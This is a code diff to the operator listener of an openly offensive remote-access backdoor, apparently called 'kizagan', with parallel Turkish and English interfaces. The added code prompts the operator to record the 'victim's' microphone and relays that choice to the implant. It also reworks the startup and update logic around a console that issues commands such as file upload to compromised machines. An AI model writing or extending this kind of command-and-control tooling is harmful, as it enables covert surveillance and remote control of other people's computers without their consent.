@@ -32,6 +32,7 @@ class TR_Dinleyici():
             print(Fore.RED+"[-]CTRL+C algılandı.Çıkılıyor...")
             exit()
         print(Fore.GREEN+"[!]Kurban baglantisi geldi :" + str(adres)+"\n\n")
+        self.Mikrofon_kaydetme_Sorusu()
         time.sleep(2)
         self.Banner_goster()
         print(Fore.RED+"Komutlar için 'yardim' yaziniz.")
@@ -104,7 +105,19 @@ class TR_Dinleyici():
         print(renk+"\t\t\t\t\t\tYazarı : Yiğit Aydemir\n\n\n\n")
         time.sleep(0.5)
 
-
+    def Mikrofon_kaydetme_Sorusu(self):
+        print(Fore.RED + "[?]Kurban bilgisayarın mikrofununu kaydetmek ister misin?(Eğer mikrofonu kaydedersen,backdoor daha çok kurban bilgisayarın RAM'ını harcayacak.)(E/H)")
+        mikrofon_secimi = input(Fore.GREEN + "Seçim?(E/H) :")
+        if mikrofon_secimi == "E" or mikrofon_secimi == "e":
+            self.Json_Gonder(mikrofon_secimi)
+            self.Json_Al()
+        elif mikrofon_secimi == "H" or mikrofon_secimi == "h":
+            self.Json_Gonder(mikrofon_secimi)
+            self.Json_Al()
+        else:
+            print(Fore.YELLOW+"[-]Yanlış seçim.Lütfen tekrar seçin.")
+            time.sleep(2)
+            self.Mikrofon_kaydetme_Sorusu()
 
     def Json_Gonder(self,bilgi):
         json_bilgisi = simplejson.dumps(bilgi)
@@ -150,6 +163,7 @@ class TR_Dinleyici():
     def Yardim(self):
         with open("menus/menuTR.txt","r",encoding="utf-8") as menu:
             return Fore.GREEN+menu.read()
+
     def Dinleyici_Basla(self):
         while True:
             global komut_girisi
@@ -202,6 +216,8 @@ class EN_Listener():
             print(Fore.RED+"[-]CTRL+C detected.Exiting...")
             exit()
         print(Fore.GREEN + "[!]A victim connection came :" + str(self.address) + "\n\n")
+        time.sleep(2)
+        self.Mic_Record_Question()
         time.sleep(2)
         self.Show_Banner()
         print(Fore.RED + "For commands,use 'help' command.")
@@ -274,6 +290,19 @@ class EN_Listener():
         print(color + "\t\t\t\t\t\tAuthor : Yiğit Aydemir\n\n\n\n")
         time.sleep(0.5)
 
+    def Mic_Record_Question(self):
+        print(Fore.RED + "[?]Do you want to record victim's microphone?(If you record microphone,backdoor will consume more RAM of victim.)(Y/N)")
+        mic_choice = input(Fore.GREEN + "Choice?(Y/N) :")
+        if mic_choice == "Y" or mic_choice == "y":
+            self.Send_Json(mic_choice)
+            self.Get_Json()
+        elif mic_choice == "N" or mic_choice == "n":
+            self.Send_Json(mic_choice)
+            self.Get_Json()
+        else:
+            print(Fore.YELLOW+"[-]Wrong choice.Please choose again.")
+            time.sleep(2)
+            self.Mic_Record_Question()
     def Send_Json(self, data):
         json_data = simplejson.dumps(data)
         self.connection.send(json_data.encode("utf-8"))
@@ -329,7 +358,6 @@ class EN_Listener():
             print(Fore.RED + "<<<<<Console@victim>>>>>")
             komut_girisi = input(Fore.BLUE + "╰──------>Command:")
             komut_girisi = komut_girisi.split(" ")
-
             try:
                 if komut_girisi[0] == "upload":
                     file_content = self.Get_File_Contents(komut_girisi[1])
@@ -354,72 +382,80 @@ class EN_Listener():
                 print(Back.BLACK + Fore.YELLOW + "The command could not be applied.The victim may disconnected.")
             print(command_output)
 
-ap = argparse.ArgumentParser()
-ap.add_argument("-ip","--ip_address",required=True,help="Enter the IP address to listen/tr:Dinlemek istediğiniz IP adresini giriniz")
-ap.add_argument("-p","--port",required=True,help="Enter port to listen/tr:Dinlemek istediğiniz portu giriniz")
-args = vars(ap.parse_args())
-def Language_Choice_And_Update():
-    try:
+class Main_Start():
+    def __init__(self):
+        self.ap = argparse.ArgumentParser()
+        self.ap.add_argument("-ip", "--ip_address", required=True,help="Enter the IP address to listen/tr:Dinlemek istediğiniz IP adresini giriniz")
+        self.ap.add_argument("-p", "--port", required=True,help="Enter port to listen/tr:Dinlemek istediğiniz portu giriniz")
+        self.args = vars(self.ap.parse_args())
+        language = self.Language_Choice()
+        self.Update_Question(language)
+        self.connection_value = ""
+    def Language_Choice(self):
+        self.choice = ""
         os.system("clear")
         print(Fore.RED + "Dil seciniz/Choose Language :\n\ntr:Türkçe\nen:English")
-        choice = input(Fore.BLUE + "Choice/Seciminiz:")
-        if choice == "tr":
+        self.choice = input(Fore.BLUE + "Choice/Seciminiz:")
+        if self.choice == "tr" or self.choice == "en":
+            return self.choice
+        else:
+            print(Fore.YELLOW+"[+]You choosed a wrong language.Please choose again./Yanlış dil seçtiniz.Lütfen tekrar seçiniz.")
+            time.sleep(2)
+            return self.Language_Choice()
+    def Update(self,language):
+        version_control.Update()
+        if language == "tr":
+            print(Fore.BLUE+"[+]Güncelleme yapıldı.Güncellenmiş dosyanız = 'updated_kizagan' artık onu kullanin.")
+        else:
+            print(Fore.BLUE+"[+]Update completed.You can use 'updated_kizagan' directory now.")
+
+    def Update_Question(self,language):
+        try:
             guncelleme_var_mi = version_control.Is_Update_Avaliable()
             if guncelleme_var_mi:
-                dinleyici = TR_Dinleyici(args["ip_address"],int(args["port"]))
-                dinleyici.Dinleyici_Basla()
+                if language == "tr":
+                    self.connection_value = "TR"
+                    self.dinleyici = TR_Dinleyici(self.args["ip_address"], int(self.args["port"]))
+                    self.dinleyici.Dinleyici_Basla()
+                else:
+                    self.connection_value = "EN"
+                    self.listener = EN_Listener(self.args["ip_address"],int(self.args["port"]))
+                    self.listener.Start_Listener()
             else:
-                def Guncelleme():
-                    print(Fore.RED+"[!]Güncelleme mevcut.İndirmek ve kurmak ister misiniz?(E/H)")
-                    guncelleme_cevap = input(Fore.MAGENTA+"Guncelleme yapilsin? :")
+                if language == "tr":
+                    print(Fore.RED + "[!]Güncelleme mevcut.İndirmek ve kurmak ister misiniz?(E/H)")
+                    guncelleme_cevap = input(Fore.MAGENTA + "Guncelleme yapilsin? :")
                     if guncelleme_cevap == "E" or guncelleme_cevap == "e":
-                        version_control.Update()
-                        print(Fore.BLUE+"[+]Güncelleme yapıldı.Güncellenmiş dosyanız = updated_kizagan arik onu kullanabilirsiniz.")
-                        exit()
+                        self.Update("tr")
                     elif guncelleme_cevap == "H" or guncelleme_cevap == "h":
-                        print(Fore.YELLOW+"[+]Güncelleme yapılmayacaktır.")
+                        print(Fore.GREEN+"[+]Güncelleme yapılmayacak.Listener başlatılıyor...")
                         time.sleep(1)
-                        dinleyici = TR_Dinleyici(args["ip_address"], int(args["port"]))
-                        dinleyici.Dinleyici_Basla()
+                        self.connection_value = "TR"
+                        self.dinleyici = TR_Dinleyici(self.args["ip_address"], int(self.args["port"]))
+                        self.dinleyici.Dinleyici_Basla()
                     else:
-                        print(Fore.LIGHTRED_EX+"[-]Yanlış seçim lütfen tekrar seçiniz.")
-                        Guncelleme()
-                Guncelleme()
-
-        elif choice == "en":
-            is_update = version_control.Is_Update_Avaliable()
-            if is_update:
-                listener = EN_Listener(args["ip_address"], int(args["port"]))
-                listener.Start_Listener()
+                        print(Fore.LIGHTRED_EX+"[-]Yanlış seçim.Lütfen tekrar seçiniz.")
+                        self.Update_Question("tr")
+                elif language == "en":
+                    print(Fore.RED+"[!]An update avaliable.Do you want to download?(Y/N)")
+                    update_answer = input(Fore.MAGENTA+"Make an update? :")
+                    if update_answer == "Y" or update_answer == "y":
+                        self.Update("en")
+                    elif update_answer == "N" or update_answer == "n":
+                        print(Fore.GREEN+"[+]Update will not be applied.Starting listener...")
+                        time.sleep(1)
+                        self.connection_value = "EN"
+                        self.listener = EN_Listener(self.args["ip_address"],int(self.args["port"]))
+                        self.listener.Start_Listener()
+                    else:
+                        print(Fore.LIGHTRED_EX+"[-]Wrong choice.Please choose again.")
+                        self.Update_Question("en")
+        except KeyboardInterrupt:
+            if self.connection_value == "TR":
+                print(Fore.RED+"[+]CTRL+C algılandı.Çıkış yapılıyor...")
+                exit()
             else:
-                def Updating():
-                    print(Fore.RED + "[!]Update avaliable.Do you want to download?(Y/N)")
-                    updating_answer = input(Fore.MAGENTA + "Make an update? :")
-                    if updating_answer == "Y" or updating_answer == "y":
-                        version_control.Update()
-                        print(Fore.BLUE + "[+]Update was successfully.You can use updated_kizagan file.")
-                        exit()
-                    elif updating_answer == "N" or updating_answer == "n":
-                        print(Fore.YELLOW + "[+]There will be no update.")
-                        time.sleep(1)
-                        listener = EN_Listener(args["ip_address"], int(args["port"]))
-                        listener.Start_Listener()
-                    else:
-                        print(Fore.LIGHTRED_EX + "[-]Wrong choice.Choose it again.")
-                        Updating()
+                print(Fore.RED+"[+]CTRL+C detected.Exiting...")
+                exit()
 
-                Updating()
-        else:
-            print("Wrong choice. Use 'tr' or 'en'./Yanlış seçim. 'tr' veya 'en' kullanin.")
-            time.sleep(2)
-            Language_Choice_And_Update()
-    except KeyboardInterrupt:
-        if choice == "tr":
-            print(Fore.RED+"[-]CTRL+C algılandı.Çıkılıyor...")
-            dinleyici.baglanti.close()
-            exit()
-        elif choice == "en":
-            print(Fore.BLUE+"[-]CTRL+C detected.Exiting...")
-            listener.connection.close()
-            exit()
-Language_Choice_And_Update()
+start = Main_Start()
